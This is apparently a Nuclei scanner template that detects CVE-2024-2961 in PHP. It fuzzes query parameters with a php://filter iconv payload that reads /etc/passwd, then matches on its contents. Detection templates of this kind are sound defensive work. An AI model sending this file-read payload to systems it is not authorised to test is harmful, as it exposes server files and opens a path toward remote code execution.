flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - '!regex("root:x:0:0", body)'
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}'
- fuzzing:
  - fuzz:
    - '{{phppayload}}'
    mode: single
    part: query
    type: replace
  matchers:
  - regex:
    - root:x:0:0
    type: regex
  payloads:
    phppayload:
    - php://filter/read=convert.iconv.UTF-8/ISO-2022-CN-EXT/resource=/etc/passwd
  pre-condition:
  - dsl:
    - method == "GET"
    - method == "POST"
    type: dsl
  stop-at-first-match: true
id: CVE-2024-2961
info:
  author: Kim Dongyoung (Kairos-hk),bolkv,n0ming,RoughBoy0723
  classification:
    cve-id: CVE-2024-2961
    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H
    cvss-score: 7.3
    cwe-id: CWE-787
    epss-percentile: 0.99754
    epss-score: 0.9286
  description: 'PHP Local File Read vulnerability leading to Remote Code Execution

    '
  impact: 'Remote attackers can execute arbitrary code on the server

    '
  name: PHP - LFR to Remote Code Execution
  reference:
  - https://github.com/vulhub/vulhub/tree/master/php/CVE-2024-2961
  - https://nvd.nist.gov/vuln/detail/CVE-2024-2961
  remediation: 'Update PHP to the latest version and sanitize user input to prevent
    LFR attacks

    '
  severity: high
  tags: cve,cve2024,php,iconv,glibc,lfr,rce,dast,vkev,vuln
